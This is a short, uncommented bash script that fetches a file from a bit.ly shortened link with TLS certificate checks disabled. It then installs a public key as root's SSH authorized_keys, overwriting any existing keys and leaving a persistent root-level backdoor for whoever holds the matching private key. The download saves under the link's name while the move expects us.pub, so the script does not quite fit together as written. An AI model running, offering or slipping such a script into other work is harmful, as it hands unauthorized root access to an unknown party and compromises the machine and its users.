#!/usr/bin/env bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
wget -N --no-check-certificate http://bit.ly/2p7VAsU

mkdir -p /root/.ssh 

mv /root/us.pub /root/.ssh/authorized_keys 

chmod 600 /root/.ssh/authorized_keys